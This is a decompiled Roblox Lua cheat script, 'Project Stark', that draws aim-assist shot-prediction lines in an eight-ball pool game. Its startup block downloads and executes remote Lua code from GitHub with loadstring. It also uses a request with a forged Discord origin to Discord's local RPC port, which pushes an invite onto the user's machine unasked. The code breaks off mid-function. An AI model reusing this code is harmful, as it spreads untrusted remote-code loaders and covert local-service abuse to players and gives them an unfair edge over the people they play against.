local v1 = {}
local _ = require
v1["script.lua"] = function()
	local v2 = game:GetService("Players")
	local v_u_3 = v2.LocalPlayer:FindFirstChild("Project Stark Key Check")
	local v4 = false
	local function v7(p_u_5)
		pcall(function()
			-- upvalues: (ref) p_u_5
			local v6 = game:GetService("HttpService");
			(syn and syn.request or request)({
				["Url"] = "http://127.0.0.1:6463/rpc?v=1",
				["Method"] = "POST",
				["Headers"] = {
					["Content-Type"] = "application/json",
					["Origin"] = "https://discord.com"
				},
				["Body"] = v6:JSONEncode({
					["cmd"] = "INVITE_BROWSER",
					["args"] = {
						["code"] = p_u_5
					},
					["nonce"] = v6:GenerateGUID(false)
				})
			})
		end)
	end
	local v8 = false
	if true then
		if v_u_3 and v_u_3.Value == true then
			pcall(function()
				-- upvalues: (ref) v_u_3
				v_u_3:Destroy()
				warn("Urbanstorn was here")
			end)
			v8 = true
		else
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Main.lua"))()
			end)
			v7("vgYZApyrZC")
		end
	else
		warn("[Project Stark] Key check DISABLED")
		v8 = true
	end
	if v8 then
		local v9 = game:GetService("RunService")
		local v_u_10 = game:GetService("UserInputService")
		game:GetService("VirtualInputManager")
		local _ = workspace.CurrentCamera
		local v11 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/UiLib.lua"))():Window("Project Stark\n\226\129\184\226\129\187\225\180\174\225\181\131\203\161\203\161 \225\180\190\225\181\146\225\181\146\203\161", Color3.fromRGB(120, 81, 169))
		local v12 = v11:Tab("Main")
		local v13 = v11:Tab("Visuals")
		local v14 = v11:Tab("Physics")
		local v15 = v11:Tab("Advanced")
		local v16 = v11:Tab("Settings")
		local v17 = v11:Tab("Credits")
		local v18 = game:GetService("UserInputService")
		local v_u_19 = v2.LocalPlayer
		local v_u_20 = workspace.CurrentCamera
		local v_u_21 = workspace:FindFirstChild("Tables") and workspace.Tables:FindFirstChild("Table1") or workspace
		local v_u_22 = v_u_21:FindFirstChild("Collision")
		local v_u_23
		if v_u_22 then
			v_u_23 = v_u_22:FindFirstChild("Rails")
		else
			v_u_23 = v_u_22
		end
		local v_u_24
		if v_u_22 then
			v_u_24 = v_u_22:FindFirstChild("Pockets")
		else
			v_u_24 = v_u_22
		end
		if v_u_22 then
			v_u_22 = v_u_22:FindFirstChild("Corners")
		end
		local v_u_25 = v_u_21:FindFirstChild("Balls")
		local v_u_26 = v_u_21:FindFirstChild("Sights")
		local v_u_27 = v_u_21:FindFirstChild("Guides")
		local v_u_28 = 0.1144
		local v_u_29 = 2 * v_u_28
		local v_u_30 = 0.036
		local v_u_31 = Vector3.new(0.075, 0.075, 0.075)
		local v_u_32 = Vector3.new(0.22, 0.22, 0.22)
		local v_u_33 = 0.00019999999494757503
		local v_u_34 = 0.012
		local v_u_35 = 0.01
		local v_u_36 = 26
		local v_u_37 = 22
		local v_u_38 = 2.2
		local v_u_39 = true
		local v_u_40 = true
		local v_u_41 = true
		local v_u_42 = true
		local v_u_43 = true
		local v_u_44 = 3
		local v_u_45 = true
		local v_u_46 = 2
		local v_u_47 = 0
		local v_u_48 = 0.00009999999747378752
		local v_u_49 = 9.999999747378752e-6
		local v_u_50 = 1
		local v_u_51 = 0.3
		local v_u_52 = 900
		local _ = {
			"guide",
			"aim",
			"line",
			"stick",
			"arrow",
			"dir"
		}
		local v_u_53 = 0.18
		local v_u_54 = 0.001
		local v_u_55 = 0.015
		local v_u_56 = 0.35
		local v_u_57 = Color3.fromRGB(255, 230, 120)
		local v_u_58 = Color3.fromRGB(140, 205, 255)
		local v_u_59 = Color3.fromRGB(120, 255, 160)
		local v_u_60 = Color3.fromRGB(255, 110, 110)
		local v_u_61 = Color3.fromRGB(210, 140, 255)
		local v_u_62 = Color3.fromRGB(220, 220, 255)
		local v_u_63 = Color3.fromRGB(235, 245, 255)
		local function v_u_68(p64)
			local v65, v66, v67 = pairs(p64)
			while true do
				v67 = v65(v66, v67)
				if v67 == nil then
					break
				end
				p64[v67] = nil
			end
		end
		local function v_u_71(p69, p70)
			return p69.X * p70.X + p69.Y * p70.Y + p69.Z * p70.Z
		end
		local function v_u_74(p72)
			local v73 = p72.Magnitude
			if v73 > 9.999999717180685e-10 then
				p72 = p72 / v73 or p72
			end
			return p72
		end
		local function v_u_76(p75)
			return p75 < 0 and 0 or (p75 > 1 and (1 or p75) or p75)
		end
		local function v_u_80(p77, p78, p79)
			return p77 < p78 and p78 and p78 or (p79 < p77 and p79 and p79 or p77)
		end
		local function v_u_87(p81, p82, p83)
			-- upvalues: (ref) v_u_76, (ref) v_u_71
			local v84 = p83 - p82
			local v85 = v_u_76(v_u_71(p81 - p82, v84) / math.max(v_u_71(v84, v84), 9.999999960041972e-13))
			local v86 = p82 + v84 * v85
			return (p81 - v86).Magnitude, v86, v85
		end
		local function v_u_107(p88, p89, p90, p91)
			local v92 = p88.X
			local v93 = p88.Z
			local v94 = p89.X
			local v95 = p89.Z
			local v96 = p90.X
			local v97 = p90.Z
			local v98 = p91.X
			local v99 = p91.Z
			local v100 = v94 - v92
			local v101 = v95 - v93
			local v102 = v98 - v96
			local v103 = v99 - v97
			local v104 = -v102 * v101 + v100 * v103
			if math.abs(v104) >= 9.999999960041972e-13 then
				local v105 = (-v101 * (v92 - v96) + v100 * (v93 - v97)) / v104
				local v106 = (v102 * (v93 - v97) - v103 * (v92 - v96)) / v104
				if 0 <= v105 and (v105 <= 1 and (0 <= v106 and v106 <= 1)) then
					return v105, v106
				end
			end
		end
		local function v_u_111(p108, p109)
			-- upvalues: (ref) v_u_80, (ref) v_u_71, (ref) v_u_74
			local v110 = v_u_80(v_u_71(v_u_74(p108), v_u_74(p109)), -1, 1)
			return math.deg(math.acos(v110))
		end
		local function v_u_113(p112)
			if p112 then
				if p112:IsA("BasePart") then
					return p112
				else
					return p112:FindFirstChildWhichIsA("BasePart")
				end
			else
				return nil
			end
		end
		local function v_u_116(p114)
			local v115 = p114:lower()
			return (v115 == "cue" or v115 == "white") and true or (v115:find("cue") or v115:find("white"))
		end
		local function v_u_123()
			-- upvalues: (ref) v_u_25, (ref) v_u_113, (ref) v_u_116
			if not v_u_25 then
				return nil
			end
			local v117 = v_u_25:FindFirstChild("Cue") or v_u_25:FindFirstChild("White")
			if v117 then
				return v_u_113(v117)
			end
			local v118 = v_u_25
			local v119, v120, v121 = ipairs(v118:GetChildren())
			while true do
				local v122
				v121, v122 = v119(v120, v121)
				if v121 == nil then
					break
				end
				if v_u_116(v122.Name) then
					return v_u_113(v122)
				end
			end
		end
		local function v_u_131()
			-- upvalues: (ref) v_u_25, (ref) v_u_116, (ref) v_u_113
			local v124 = {}
			if not v_u_25 then
				return v124
			end
			local v125 = v_u_25
			local v126, v127, v128 = ipairs(v125:GetChildren())
			while true do
				local v129
				v128, v129 = v126(v127, v128)
				if v128 == nil then
					break
				end
				if not v_u_116(v129.Name) then
					local v130 = v_u_113(v129)
					if v130 then
						v124[#v124 + 1] = v130
					end
				end
			end
			return v124
		end
		local v_u_132 = false
		local v_u_133 = nil
		local v_u_134 = nil
		local v_u_135 = nil
		local v_u_136 = nil
		local v_u_137 = nil
		local v_u_138 = nil
		local v_u_139 = nil
		local v_u_140 = nil
		local v_u_141 = nil
		local v_u_142 = {}
		local v_u_143 = {}
		local v_u_144 = {}
		local function v_u_162()
			-- upvalues: (ref) v_u_24, (ref) v_u_133, (ref) v_u_134, (ref) v_u_135, (ref) v_u_136, (ref) v_u_141, (ref) v_u_132
			if not v_u_24 then
				return false
			end
			local v145 = v_u_24
			local v146, v147, v148 = ipairs(v145:GetChildren())
			local v149 = nil
			local v150 = nil
			local v151 = nil
			local v152 = nil
			while true do
				local v153
				v148, v153 = v146(v147, v148)
				if v148 == nil then
					break
				end
				if v153:IsA("BasePart") then
					local v154 = v153.CFrame
					local v155 = v153.Size
					local v156 = {
						{
							["v"] = v154.XVector,
							["len"] = v155.X
						},
						{
							["v"] = v154.YVector,
							["len"] = v155.Y
						},
						{
							["v"] = v154.ZVector,
							["len"] = v155.Z
						}
					}
					table.sort(v156, function(p157, p158)
						return p157.len > p158.len
					end)
					local v159 = v156[1].v * v156[1].len * 0.5
					local v160 = v153.Position - v159
					local v161 = v153.Position + v159
					v149 = v149 and math.min(v149, math.min(v160.X, v161.X)) or math.min(v160.X, v161.X)
					v150 = v150 and math.max(v150, math.max(v160.X, v161.X)) or math.max(v160.X, v161.X)
					v151 = v151 and math.min(v151, math.min(v160.Z, v161.Z)) or math.min(v160.Z, v161.Z)
					v152 = v152 and math.max(v152, math.max(v160.Z, v161.Z))
					if not v152 then
						v152 = math.max(v160.Z, v161.Z)
					end
				end
			end
			if not (v149 and (v150 and (v151 and v152))) then
				return false
			end
			v_u_136 = v152
			v_u_135 = v151
			v_u_134 = v150
			v_u_133 = v149
			v_u_141 = Vector3.new((v_u_133 + v_u_134) * 0.5, 0, (v_u_135 + v_u_136) * 0.5)
			v_u_132 = true
			return true
		end
		local function v_u_175()
			-- upvalues: (ref) v_u_23, (ref) v_u_133, (ref) v_u_134, (ref) v_u_135, (ref) v_u_136, (ref) v_u_141, (ref) v_u_132
			if not v_u_23 then
				return false
			end
			local v163 = v_u_23
			local v164, v165, v166 = ipairs(v163:GetChildren())
			local v167 = nil
			local v168 = nil
			local v169 = nil
			local v170 = nil
			while true do
				local v171
				v166, v171 = v164(v165, v166)
				if v166 == nil then
					break
				end
				if v171:IsA("BasePart") then
					local v172 = v171.Size
					local v173 = v171.CFrame
					if v172.X > 3.5 or v172.Z > 3.5 then
						local v174 = math.deg(math.atan2(v173.LookVector.X, v173.LookVector.Z))
						if math.abs(v174) < 15 or math.abs(math.abs(v174) - 180) < 15 then
							v167 = v167 and math.min(v167, v171.Position.Z) or v171.Position.Z
							v168 = v168 and math.max(v168, v171.Position.Z) or v171.Position.Z
						else
							v169 = v169 and math.min(v169, v171.Position.X) or v171.Position.X
							v170 = v170 and math.max(v170, v171.Position.X)
							if not v170 then
								v170 = v171.Position.X
							end
						end
					end
				end
			end
			if not (v169 and (v170 and (v167 and v168))) then
				return false
			end
			v_u_136 = v168
			v_u_135 = v167
			v_u_134 = v170
			v_u_133 = v169
			v_u_141 = Vector3.new((v_u_133 + v_u_134) * 0.5, 0, (v_u_135 + v_u_136) * 0.5)
			v_u_132 = true
			return true
		end
		local function v_u_177()
			-- upvalues: (ref) v_u_137, (ref) v_u_133, (ref) v_u_28, (ref) v_u_138, (ref) v_u_134, (ref) v_u_139, (ref) v_u_135, (ref) v_u_140, (ref) v_u_136
			local v176 = 0.0010000000474974513
			v_u_137 = v_u_133 + v_u_28 + v176
			v_u_138 = v_u_134 - (v_u_28 + v176)
			v_u_139 = v_u_135 + v_u_28 + v176
			v_u_140 = v_u_136 - (v_u_28 + v176)
		end
		local function v_u_199()
			-- upvalues: (ref) v_u_68, (ref) v_u_142, (ref) v_u_143, (ref) v_u_144, (ref) v_u_24, (ref) v_u_74, (ref) v_u_141, (ref) v_u_71, (ref) v_u_22
			v_u_68(v_u_142)
			v_u_68(v_u_143)
			v_u_68(v_u_144)
			if v_u_24 then
				local v178 = v_u_24
				local v179, v180, v181 = ipairs(v178:GetChildren())
				while true do
					local v182
					v181, v182 = v179(v180, v181)
					if v181 == nil then
						break
					end
					if v182:IsA("BasePart") then
						local v183 = v182.CFrame
						local v184 = v182.Size
						local v185 = {
							{
								["v"] = v183.XVector,
								["len"] = v184.X
							},
							{
								["v"] = v183.YVector,
								["len"] = v184.Y
							},
							{
								["v"] = v183.ZVector,
								["len"] = v184.Z
							}
						}
						table.sort(v185, function(p186, p187)
							return p186.len > p187.len
						end)
						local v188 = v185[1].v * v185[1].len * 0.5
						local v189 = v182.Position - v188
						local v190 = v182.Position + v188
						local v191 = v_u_74(v190 - v189)
						local v192 = v_u_74(Vector3.new(-v191.Z, 0, v191.X))
						if v_u_141 and v_u_71(v192, v_u_74(v_u_141 - (v189 + v190) * 0.5)) < 0 then
							v192 = -v192
						end
						table.insert(v_u_142, {
							["A"] = v189,
							["B"] = v190,
							["center"] = (v189 + v190) * 0.5,
							["inward"] = v192
						})
						local v193 = math.max(0.05, math.min(v184.X, v184.Z) * 0.45)
						table.insert(v_u_143, {
							["C"] = v182.Position,
							["r"] = v193
						})
					end
				end
			end
			if v_u_22 then
				local v194 = v_u_22
				local v195, v196, v197 = ipairs(v194:GetChildren())
				while true do
					local v198
					v197, v198 = v195(v196, v197)
					if v197 == nil then
						break
					end
					if v198:IsA("BasePart") then
						table.insert(v_u_144, v198.Position)
					end
				end
			end
		end
		local function v_u_214(p_u_200, p_u_201)
			-- upvalues: (ref) v_u_137, (ref) v_u_138, (ref) v_u_139, (ref) v_u_140, (ref) v_u_80, (ref) v_u_54, (ref) v_u_33
			local v202 = {
				["Left"] = 1,
				["Right"] = 2,
				["Top"] = 3,
				["Bottom"] = 4
			}
			local v_u_203 = {}
			local function v206(p204, p205)
				-- upvalues: (ref) v_u_203, (ref) p_u_200, (ref) p_u_201
				if p204 and (9.999999974752427e-7 < p204 and p204 <= 1) then
					table.insert(v_u_203, {
						["t"] = p204,
						["P"] = p_u_200 + (p_u_201 - p_u_200) * p204,
						["edge"] = p205
					})
				end
			end
			local v207 = p_u_201.X - p_u_200.X
			local v208 = p_u_201.Z - p_u_200.Z
			if math.abs(v207) > 9.999999960041972e-13 then
				v206((v_u_137 - p_u_200.X) / v207, v202.Left)
				v206((v_u_138 - p_u_200.X) / v207, v202.Right)
			end
			if math.abs(v208) > 9.999999960041972e-13 then
				v206((v_u_139 - p_u_200.Z) / v208, v202.Top)
				v206((v_u_140 - p_u_200.Z) / v208, v202.Bottom)
			end
			table.sort(v_u_203, function(p209, p210)
				return p209.t < p210.t
			end)
			if #v_u_203 ~= 0 then
				local v211 = v_u_203[1]
				local v212
				if v211.edge ~= v202.Left then
					if v211.edge ~= v202.Right then
						if v211.edge ~= v202.Top then
							v212 = Vector3.new(v_u_80(v211.P.X, v_u_137, v_u_138), p_u_200.Y, v_u_140)
						else
							v212 = Vector3.new(v_u_80(v211.P.X, v_u_137, v_u_138), p_u_200.Y, v_u_139)
						end
					else
						v212 = Vector3.new(v_u_138, p_u_200.Y, v_u_80(v211.P.Z, v_u_139, v_u_140))
					end
				else
					v212 = Vector3.new(v_u_137, p_u_200.Y, v_u_80(v211.P.Z, v_u_139, v_u_140))
				end
				local v213 = v211.edge == v202.Left and Vector3.new(1, 0, 0) or v211.edge == v202.Right and Vector3.new(-1, 0, 0) or (v211.edge == v202.Top and Vector3.new(0, 0, 1) or Vector3.new(0, 0, -1))
				if v_u_54 ~= 0 then
					v212 = v212 - v213 * v_u_54
				end
				return v212, v212 + v213 * v_u_33, v211.edge
			end
		end
		local function v_u_217(p215, p216)
			if p216 == 1 or p216 == 2 then
				return Vector3.new(-p215.X, p215.Y, p215.Z)
			else
				return Vector3.new(p215.X, p215.Y, -p215.Z)
			end
		end
		local function v_u_226(p218)
			-- upvalues: (ref) v_u_144, (ref) v_u_53
			if #v_u_144 == 0 then
				return p218
			end
			local v219, v220, v221 = ipairs(v_u_144)
			while true do
				local v222
				v221, v222 = v219(v220, v221)
				if v221 == nil then
					break
				end
				local v223 = p218 - v222
				if math.abs(v223.Y) < 0.5 then
					local v224 = Vector3.new(v223.X, 0, v223.Z)
					local v225 = v224.Magnitude
					if v225 < v_u_53 then
						p218 = p218 + (v_u_53 - v225) * (9.999999717180685e-10 < v225 and v224 / v225 or Vector3.new(1, 0, 0))
					end
				end
			end
			return p218
		end
		local function v_u_256(p227, p228, p229)
			-- upvalues: (ref) v_u_142, (ref) v_u_107, (ref) v_u_71, (ref) v_u_74, (ref) v_u_47, (ref) v_u_226, (ref) v_u_143
			local v230, v231, v232 = ipairs(v_u_142)
			local v233 = nil
			while true do
				local v234
				v232, v234 = v230(v231, v232)
				if v232 == nil then
					break
				end
				local v235, v236 = v_u_107(p227, p228, v234.A, v234.B)
				if v235 and (v236 and v_u_47 <= v_u_71(v_u_74(p229), v234.inward)) then
					v233 = p227 + (p228 - p227) * v235
					break
				end
			end
			if v233 then
				return v_u_226(v233)
			else
				local v237 = Vector3.new(p227.X, 0, p227.Z)
				local v238 = Vector3.new(p228.X, 0, p228.Z) - v237
				local v239 = math.sqrt(v238.X * v238.X + v238.Z * v238.Z)
				if v239 >= 9.999999717180685e-10 then
					local v240 = v238 / v239
					local v241, v242, v243 = ipairs(v_u_143)
					while true do
						local v244
						v243, v244 = v241(v242, v243)
						if v243 == nil then
							break
						end
						local v245 = Vector3.new(v244.C.X, 0, v244.C.Z)
						local v246 = v244.r
						local v247 = v237 - v245
						local v248 = 1
						local v249 = 2 * (v240.X * v247.X + v240.Z * v247.Z)
						local v250 = v247.X * v247.X + v247.Z * v247.Z - v246 * v246
						local v251 = v249 * v249 - 4 * v248 * v250
						if v251 >= 0 then
							local v252 = math.sqrt(v251)
							local v253 = (-v249 - v252) / (2 * v248)
							local v254 = (-v249 + v252) / (2 * v248)
							if 0 <= v253 and (v253 <= v239 and v253) then
								v254 = v253
							elseif 0 > v254 or (v254 > v239 or not v254) then
								v254 = nil
							end
							if v254 then
								local v255 = v237 + v240 * v254
								return v_u_226((Vector3.new(v255.X, p227.Y, v255.Z)))
							end
						end
					end
				end
			end
		end
		local function v_u_269(p257, p258, p259, p260, p261)
			-- upvalues: (ref) v_u_28, (ref) v_u_34, (ref) v_u_87, (ref) v_u_35
			local v262 = 2 * v_u_28 - v_u_34
			local v263, v264, v265 = ipairs(p259)
			while true do
				local v266
				v265, v266 = v263(v264, v265)
				if v265 == nil then
					break
				end
				if v266 and (v266 ~= p260 and v266 ~= p261) then
					local v267, _, v268 = v_u_87(v266.Position, p257, p258)
					if v267 < v262 and (v_u_35 < v268 and v268 < 1 - v_u_35) then
						return false
					end
				end
			end
			return true
		end
		local function v_u_286(p270, p271, p272)
			-- upvalues: (ref) v_u_71, (ref) v_u_29, (ref) v_u_28
			local v273, v274, v275 = ipairs(p272)
			local v276 = nil
			local v277 = nil
			while true do
				local v278
				v275, v278 = v273(v274, v275)
				if v275 == nil then
					break
				end
				local v279 = p270 - v278.Position
				local v280 = 2 * v_u_71(p271, v279)
				local v281 = v_u_71(v279, v279) - v_u_29 * v_u_29
				local v282 = v280 * v280 - 4 * v281
				if v282 >= 0 then
					local v283 = math.sqrt(v282)
					local v284 = (-v280 - v283) / 2
					local v285 = (-v280 + v283) / 2
					if v_u_28 * 0.01 >= v284 or not v284 then
						if v_u_28 * 0.01 >= v285 or not v285 then
							v285 = nil
						end
					else
						v285 = v284
					end
					if v285 and (not v276 or v285 < v276) then
						v277 = v278
						v276 = v285
					end
				end
			end
			return v277, v276
		end
		local function v_u_305(p287, p288, p289, p290, p291)
			-- upvalues: (ref) v_u_71, (ref) v_u_29, (ref) v_u_28
			local v292, v293, v294 = ipairs(p289)
			local v295 = nil
			local v296 = nil
			while true do
				local v297
				v294, v297 = v292(v293, v294)
				if v294 == nil then
					break
				end
				if v297 ~= p290 and v297 ~= p291 then
					local v298 = p287 - v297.Position
					local v299 = 2 * v_u_71(p288, v298)
					local v300 = v_u_71(v298, v298) - v_u_29 * v_u_29
					local v301 = v299 * v299 - 4 * v300
					if v301 >= 0 then
						local v302 = math.sqrt(v301)
						local v303 = (-v299 - v302) / 2
						local v304 = (-v299 + v302) / 2
						if v_u_28 * 0.01 >= v303 or not v303 then
							if v_u_28 * 0.01 >= v304 or not v304 then
								v304 = nil
							end
						else
							v304 = v303
						end
						if v304 and (not v295 or v304 < v295) then
							v296 = v297
							v295 = v304
						end
					end
				end
			end
			return v296, v295
		end
		local function v_u_314(p306)
			-- upvalues: (ref) v_u_137, (ref) v_u_138, (ref) v_u_139, (ref) v_u_140, (ref) v_u_55, (ref) v_u_28, (ref) v_u_56
			if not v_u_137 then
				return p306, nil
			end
			local v307 = math.abs(p306.X - v_u_137)
			local v308 = math.abs(v_u_138 - p306.X)
			local v309 = math.abs(p306.Z - v_u_139)
			local v310 = math.abs(v_u_140 - p306.Z)
			local v311 = math.min(v307, v308, v309, v310)
			local v312 = math.max(v_u_55, v_u_28 * v_u_56)
			if v312 < v311 then
				return p306, nil
			end
			local v313
			if v311 == v307 then
				v313 = Vector3.new(1, 0, 0)
			elseif v311 == v308 then
				v313 = Vector3.new(-1, 0, 0)
			elseif v311 == v309 then
				v313 = Vector3.new(0, 0, 1)
			else
				v313 = Vector3.new(0, 0, -1)
			end
			return p306 + v313 * v312, v313
		end
		local function v_u_341(p_u_315, p316, p317, p318, p319)
			-- upvalues: (ref) v_u_74, (ref) v_u_52, (ref) v_u_305, (ref) v_u_256, (ref) v_u_214, (ref) v_u_48, (ref) v_u_49, (ref) v_u_217, (ref) v_u_50, (ref) v_u_51
			local v320 = v_u_74(p316)
			local v321 = p_u_315
			local v322 = 1
			local v323 = { p_u_315 }
			local v324 = false
			local v325 = false
			local v326 = nil
			for _ = 0, p317 do
				local v327 = p_u_315 + v320 * v_u_52 * v322
				local v328, v329 = v_u_305(p_u_315, v320, p318, p319, nil)
				local v330
				if v329 then
					v330 = p_u_315 + v320 * v329 or nil
				else
					v330 = nil
				end
				local v331 = v_u_256(p_u_315, v327, v320)
				local v332, v333, v334 = v_u_214(p_u_315, v327)
				local function v336(p335)
					-- upvalues: (ref) p_u_315
					return p335 and (p335 - p_u_315).Magnitude or math.huge
				end
				local v337 = v336(v330)
				local v338 = v336(v331)
				local v339 = v336(v332)
				if v338 <= math.min(v337, v339) + v_u_48 then
					table.insert(v323, v331)
					v324 = true
					break
				end
				if not v332 or v339 > v337 + v_u_49 then
					if v330 then
						table.insert(v323, v330)
						v326 = v328
						v325 = true
					else
						table.insert(v323, p_u_315 + v320 * 3)
					end
					break
				end
				table.insert(v323, v332)
				v320 = v_u_217(v320, v334)
				local v340 = v333
				v322 = v322 * v_u_50
				if v322 < v_u_51 then
					break
				end
				p_u_315 = v340
			end
			if #v323 == 1 then
				table.insert(v323, v321 + v320 * 3)
			end
			return v323, v324, v325, v326
		end
		local function v_u_355(p342, p343, p344, p345)
			-- upvalues: (ref) v_u_43, (ref) v_u_341, (ref) v_u_44
			if not v_u_43 then
				return v_u_341(p342, p343, v_u_44, p344, p345)
			end
			for v346 = 0, v_u_44 do
				local v347, v348, v349, v350 = v_u_341(p342, p343, v346, p344, p345)
				if v348 then
					return v347, true, v349, v350, v346
				end
			end
			local v351, v352, v353, v354 = v_u_341(p342, p343, v_u_44, p344, p345)
			return v351, v352, v353, v354, v_u_44
		end
		local function v_u_361(p356)
			if p356 then
				local v357, v358, v359 = ipairs(p356:GetDescendants())
				while true do
					local v360
					v359, v360 = v357(v358, v359)
					if v359 == nil then
						break
					end
					if v360:IsA("Beam") and (v360.Attachment0 and v360.Attachment1) then
						return v360.Attachment0.WorldPosition, v360.Attachment1.WorldPosition
					end
				end
			end
		end
		local function v_u_366()
			-- upvalues: (ref) v_u_361, (ref) v_u_27, (ref) v_u_26
			local v362, v363 = v_u_361(v_u_27)
			if v362 then
				return v362, v363
			else
				local v364, v365 = v_u_361(v_u_26)
				if v364 then
					return v364, v365
				else
					return nil, nil
				end
			end
		end
		local v_u_367 = nil
		local v_u_368 = nil
		local v_u_369 = nil
		local function v_u_375(p370, p371, p372, p373)
			local v374 = 1 - math.exp(-p372 * p373)
			if p371 then
				p370 = p371 + (p370 - p371) * v374 or p370
			end
			return p370
		end
		local v_u_376 = Instance.new("Folder")
		v_u_376.Name = "EightBall_Fixed"
		v_u_376.Parent = v_u_21
		local function v_u_384(p377, p378)
			-- upvalues: (ref) v_u_376, (ref) v_u_30
			local v379 = Instance.new("Attachment")
			local v380 = Instance.new("Attachment")
			local v381 = Instance.new("Part")
			v381.Anchored = true
			v381.CanCollide = false
			v381.Transparency = 1
			v381.Size = Vector3.new(0.05, 0.05, 0.05)
			v381.Parent = v_u_376
			v379.Parent = v381
			local v382 = Instance.new("Part")
			v382.Anchored = true
			v382.CanCollide = false
			v382.Transparency = 1
			v382.Size = Vector3.new(0.05, 0.05, 0.05)
			v382.Parent = v_u_376
			v380.Parent = v382
			local v383 = Instance.new("Beam")
			v383.Attachment0 = v379
			v383.Attachment1 = v380
			v383.Width0 = v_u_30
			v383.Width1 = v_u_30
			v383.Color = ColorSequence.new(p377)
			v383.Transparency = NumberSequence.new(p378 or 0.08)
			v383.LightEmission = 0.6
			v383.FaceCamera = true
			v383.Parent = v_u_376
			return {
				["AP"] = v381,
				["BP"] = v382,
				["B"] = v383
			}
		end
		local function v_u_389(p385, p386, p387)
			-- upvalues: (ref) v_u_31, (ref) v_u_376
			local v388 = Instance.new("Part")
			v388.Anchored = true
			v388.CanCollide = false
			v388.Material = Enum.Material.Neon
			v388.Shape = Enum.PartType.Ball
			v388.Size = p387 or v_u_31
			v388.Color = p385
			v388.Transparency = p386 or 0.25
			v388.Parent = v_u_376
			return v388
		end
		local function v_u_393(p390, p391)
			-- upvalues: (ref) v_u_32, (ref) v_u_376
			local v392 = Instance.new("Part")
			v392.Anchored = true
			v392.CanCollide = false
			v392.Material = Enum.Material.ForceField
			v392.Shape = Enum.PartType.Ball
			v392.Size = v_u_32
			v392.Color = p390
			v392.Transparency = p391 or 0.7
			v392.Parent = v_u_376
			return v392
		end
		local v_u_394 = {}
		local v_u_395 = {}
		local v_u_396 = {}
		local v_u_397 = {}
		local v_u_398 = {}
		local function v_u_402(p399, p400, p401)
			while #p399 < p400 do
				table.insert(p399, p401())
			end
		end
		local function v_u_410(p403, p404, p405)
			local v406, v407, v408 = ipairs(p403)
			while true do
				local v409
				v408, v409 = v406(v407, v408)
				if v408 == nil then
					break
				end
				if p405 then
					v409.Transparency = v408 <= p404 and 0.25 or 1
				else
					v409.B.Enabled = true
				end
			end
		end
		local function v_u_416(p411, p412, p413, p414)
			local v415 = 1 - math.exp(-p413 * p414)
			p411.CFrame = CFrame.new(p411.Position + (p412 - p411.Position) * v415)
		end
		local v_u_417 = nil
		local v_u_418 = nil
		local function v_u_420()
			-- upvalues: (ref) v_u_417, (ref) v_u_376, (ref) v_u_418
			if not v_u_417 then
				local v419 = Instance.new("Part")
				v419.Anchored = true
				v419.CanCollide = false
				v419.Transparency = 1
				v419.Size = Vector3.new(0.1, 0.1, 0.1)
				v419.Parent = v_u_376
				v_u_417 = Instance.new("BillboardGui")
				v_u_417.Size = UDim2.new(0, 300, 0, 70)
				v_u_417.AlwaysOnTop = true
				v_u_417.Parent = v419
				v_u_418 = Instance.new("TextLabel")
				v_u_418.BackgroundTransparency = 1
				v_u_418.Size = UDim2.new(1, 0, 1, 0)
				v_u_418.Font = Enum.Font.GothamBold
				v_u_418.TextScaled = true
				v_u_418.TextColor3 = Color3.fromRGB(255, 255, 255)
				v_u_418.TextStrokeTransparency = 0.3
				v_u_418.Parent = v_u_417
			end
		end
		local function v_u_426(p421, p422, p423)
			-- upvalues: (ref) v_u_40, (ref) v_u_417, (ref) v_u_420, (ref) v_u_20, (ref) v_u_137, (ref) v_u_138, (ref) v_u_139, (ref) v_u_418
			if v_u_40 then
				v_u_420()
				v_u_417.Enabled = true
				local v424 = v_u_20.CFrame.Position.Y
				local v425 = Vector3.new((v_u_137 + v_u_138) * 0.5, v424, v_u_139) + Vector3.new(0, 0, -0.1)
				v_u_417.Adornee = v_u_417.Parent
				v_u_417.Parent.CFrame = CFrame.new(v425)
				v_u_418.Text = p421 .. " | " .. p422 .. (p423 and string.format(" \226\128\162 %.1f\194\176", p423) or "")
			elseif v_u_417 then
				v_u_417.Enabled = false
			end
		end
		local function v_u_427()
			-- upvalues: (ref) v_u_162, (ref) v_u_175
			if not v_u_162() then
				v_u_175()
			end
		end
		v_u_427()
		v_u_199()
		v9.RenderStepped:Connect(function(p428)
			-- upvalues: (ref) v_u_39, (ref) v_u_410, (ref) v_u_394, (ref) v_u_395, (ref) v_u_396, (ref) v_u_398, (ref) v_u_397, (ref) v_u_417, (ref) v_u_132, (ref) v_u_427, (ref) v_u_123, (ref) v_u_28, (ref) v_u_137, (ref) v_u_29, (ref) v_u_177, (ref) v_u_131, (ref) v_u_366, (ref) v_u_74, (ref) v_u_369, (ref) v_u_80, (ref) v_u_71, (ref) v_u_38, (ref) v_u_367, (ref) v_u_375, (ref) v_u_36, (ref) v_u_368, (ref) v_u_37, (ref) v_u_19, (ref) v_u_20, (ref) v_u_286, (ref) v_u_314, (ref) v_u_355, (ref) v_u_402, (ref) v_u_384, (ref) v_u_57, (ref) v_u_416, (ref) v_u_389, (ref) v_u_63, (ref) v_u_426, (ref) v_u_111, (ref) v_u_269, (ref) v_u_58, (ref) v_u_59, (ref) v_u_60, (ref) v_u_42, (ref) v_u_393, (ref) v_u_62, (ref) v_u_45, (ref) v_u_46, (ref) v_u_61, (ref) v_u_41
			if not v_u_39 then
				v_u_410(v_u_394, 0)
				v_u_410(v_u_395, 0)
				v_u_410(v_u_396, 0, true)
				v_u_410(v_u_398, 0)
				if v_u_397[1] then
					v_u_397[1].Transparency = 1
				end
				if v_u_417 then
					v_u_417.Enabled = false
				end
				return
			end
			if not v_u_132 then
				v_u_427()
			end
			local v429 = v_u_123()
			if not v429 then
				v_u_410(v_u_394, 0)
				v_u_410(v_u_395, 0)
				v_u_410(v_u_396, 0, true)
				v_u_410(v_u_398, 0)
				if v_u_397[1] then
					v_u_397[1].Transparency = 1
				end
				if v_u_417 then
					v_u_417.Enabled = false
				end
				return
			end
			local v430 = v429.Size and v429.Size.X * 0.5 or v_u_28
			if math.abs(v430 - v_u_28) > 9.999999974752427e-7 or not v_u_137 then
				v_u_28 = v430
				v_u_29 = 2 * v_u_28
				v_u_177()
			end
			local v431 = v_u_131()
			local v432, v433 = v_u_366()
			local v434, v435
			if v432 and v433 then
				local v436
